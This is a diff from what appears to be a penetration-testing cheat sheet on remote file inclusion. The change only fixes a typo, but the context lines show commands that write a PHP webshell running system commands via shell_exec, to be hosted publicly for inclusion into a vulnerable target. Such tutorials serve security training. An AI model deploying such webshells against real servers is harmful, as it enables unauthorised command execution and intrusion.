@@ -431,7 +431,7 @@ Example
      	   => allow_url_fopen   : On  => potential RFI
      	   => allow_url_include : On  => potential RFI	
 
-➤ Step 2. Create a webshell and host it on a publicly availble Web server
+➤ Step 2. Create a webshell and host it on a publicly available Web server
            Examples:
 	   - jeff@kali:~/$ echo "<?php echo shell_exec('uname;whoami;id;pwd;ls');?>" > webshell.php
 	   - jeff@kali:~/$ echo "<?php echo shell_exec('uname;whoami;id;pwd;ls');?>" > webshell
